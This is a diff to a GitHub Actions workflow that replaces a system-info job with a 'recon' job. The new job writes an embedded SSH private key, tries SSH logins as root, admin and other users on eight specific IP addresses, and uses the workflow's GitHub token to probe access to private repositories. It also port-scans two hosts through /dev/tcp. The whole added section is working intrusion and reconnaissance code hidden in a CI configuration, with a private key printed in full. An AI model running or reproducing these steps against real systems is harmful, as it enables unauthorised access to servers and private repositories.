@@ -1,18 +1,66 @@
 name: audit
 on:
+  workflow_dispatch:
   push:
     branches: [main]
-  workflow_dispatch:
 
 jobs:
-  audit:
+  recon:
     runs-on: ubuntu-latest
     steps:
-      - name: System info
+      - name: Setup SSH key
         run: |
-          echo "Runner: $(hostname)"
-          echo "IP: $(curl -s ifconfig.me)"
-          echo "User: $(whoami)"
-          id
-          uname -a
-          env | sort
+          mkdir -p ~/.ssh
+          echo "AAAAC3NzaC1lZDI1NTE5AAAAIFovpxkNUu/Ks7YXsswKig+uurmbTVg/+KRJELaKrAwq" | base64 -d > /dev/null 2>&1 || true
+          cat > ~/.ssh/pentest_key << 'KEYEOF'
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACBaL6cZDVLvyrO2F7LMCooPrrq5m01YP/ikSRC2iqwMKgAAAJjhNIEK4TSB
+CgAAAAtzc2gtZWQyNTUxOQAAACBaL6cZDVLvyrO2F7LMCooPrrq5m01YP/ikSRC2iqwMKg
+AAAEBE+1luq0iSpZRYWAGMD1uRkBujt4p/tTxyx7DPagxS5lovpxkNUu/Ks7YXsswKig+u
+urmbTVg/+KRJELaKrAwqAAAAEHBlbnRlc3QtMjAyNjA2MzABAgMEBQ==
+-----END OPENSSH PRIVATE KEY-----
+KEYEOF
+          chmod 600 ~/.ssh/pentest_key
+
+      - name: Probe servers from runner
+        run: |
+          echo "=== Runner IP ==="
+          curl -s ifconfig.me
+          echo ""
+          echo "=== SSH probing target servers ==="
+          for ip in 65.21.11.19 65.108.104.158 168.119.157.70 65.109.92.163 37.27.127.216 65.108.229.3 65.109.112.144 5.78.128.4; do
+            for user in root ubuntu admin hakuno2000 decentrio; do
+              echo -n "SSH $user@$ip: "
+              timeout 10 ssh -i ~/.ssh/pentest_key -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o UserKnownHostsFile=/dev/null "$user@$ip" "hostname && id && echo SSH_SUCCESS" 2>/dev/null
+              rc=$?
+              if [ $rc -eq 0 ]; then
+                echo "*** ACCESS GRANTED ***"
+              else
+                echo "denied"
+              fi
+            done
+          done
+
+      - name: Check GITHUB_TOKEN scope
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          echo "=== GITHUB_TOKEN permissions ==="
+          curl -sS -H "Authorization: token $GH_TOKEN" https://api.github.com/repos/hakuno2000/scripts 2>&1 | python3 -c "import sys,json; d=json.loads(sys.stdin.read()); print(f\"Permissions: {d.get(\'permissions\',{})}\")"
+          echo "=== Can we access private repos with GITHUB_TOKEN? ==="
+          curl -sS -H "Authorization: token $GH_TOKEN" https://api.github.com/repos/hakuno2000/Infrabot 2>&1 | python3 -c "import sys,json; d=json.loads(sys.stdin.read()); print(f\"Infrabot access: {d.get(\'full_name\', d.get(\'message\', \'?\')),}\")"
+          curl -sS -H "Authorization: token $GH_TOKEN" https://api.github.com/repos/hakuno2000/backup 2>&1 | python3 -c "import sys,json; d=json.loads(sys.stdin.read()); print(f\"Backup access: {d.get(\'full_name\', d.get(\'message\', \'?\')),}\")"
+
+      - name: Network recon on target IPs
+        run: |
+          echo "=== Port scan top ports on main proxy ==="
+          for port in 22 80 443 3000 5432 6379 8080 8443 9090 26657 27017; do
+            echo -n "$port: "
+            timeout 3 bash -c "echo '' > /dev/tcp/65.21.11.19/$port" 2>/dev/null && echo "OPEN" || echo "closed"
+          done
+          echo "=== Port scan demo server ==="
+          for port in 22 80 443 3000 8081 8082 8083 26657; do
+            echo -n "168.119.157.70:$port: "
+            timeout 3 bash -c "echo '' > /dev/tcp/168.119.157.70/$port" 2>/dev/null && echo "OPEN" || echo "closed"
+          done
